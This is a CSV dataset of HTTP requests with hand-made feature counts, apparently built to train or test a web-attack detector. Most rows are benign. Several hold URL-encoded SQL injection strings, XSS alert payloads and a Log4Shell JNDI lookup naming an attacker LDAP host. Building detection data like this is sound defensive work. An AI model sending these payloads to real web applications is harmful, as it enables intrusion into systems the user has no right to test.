method,path,body,single_q,double_q,dashes,braces,spaces,badwords
POST,/products/view?id=1,uname=test&pass=test,0,0,0,0,0,0
GET,/languages/english?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/locations/usa,comment=Nice+product,0,0,0,0,1,0
POST,/tickets?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/crypto,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/user/notifications?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/music/playlist?id=4,,0,0,0,0,0,0
POST,/user/profile?id=2?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/api/v1/users/1,id=55,0,0,0,0,0,0
GET,/api/v2/login,,0,0,0,0,0,0
GET,/index.html,,0,0,0,0,0,0
GET,/shop,,0,0,0,0,0,0
GET,/auth/login,,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
GET,/news/world,,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
GET,/admin,,0,0,0,0,0,0
GET,/blog/category/lifestyle,,0,0,0,0,0,0
POST,/books?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/user?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/checkout/payment,comment=Nice+product,0,0,0,0,1,0
GET,/account/info,,0,0,0,0,0,0
GET,/books/bestsellers,,0,0,0,0,0,0
GET,/analytics/sales?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/university,,0,0,0,0,0,0
POST,/unsubscribe?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/products/view?id=2,uemail=test@example.com,0,0,0,0,0,0
GET,/crypto/market,,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
POST,/search?q=shoes,uname=test&pass=test,0,0,0,0,0,0
GET,/admin/reports,,0,0,0,0,0,0
POST,/products/new?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/api/v2/login?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/promo/winter,,0,0,0,0,0,0
GET,/search?page=3?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/user/cart/add?id=45?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/api/v1/users/2,,0,0,0,0,0,0
GET,/user/cart?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/locations/usa?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/docs/setup,,0,0,0,0,0,0
GET,/gallery,,0,0,0,0,0,0
GET,/playlists/mixes,,0,0,0,0,0,0
GET,/forum/post?id=2,,0,0,0,0,0,0
POST,/services.html,id=55,0,0,0,0,0,0
POST,/user/profile?id=1,uemail=test@example.com,0,0,0,0,0,0
GET,/events/past,,0,0,0,0,0,0
POST,/api/v1/users,uemail=test@example.com,0,0,0,0,0,0
POST,/api/v1/categories,uname=test&pass=test,0,0,0,0,0,0
POST,/blog/post3,,0,0,0,0,0,0
GET,/library/book?id=10,,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
GET,/books/bestsellers?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/checkout,comment=Nice+product,0,0,0,0,1,0
POST,/store/laptops,product=123&type=info,0,0,0,0,0,0
GET,/promo/winter,,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
GET,/pricing.html?q=admin%27+--,,1,0,1,0,1,0
GET,/search?q=mobiles,,0,0,0,0,0,0
GET,/shop/categories,,0,0,0,0,0,0
POST,/shop,,0,0,0,0,0,0
GET,/user/cart,,0,0,0,0,0,0
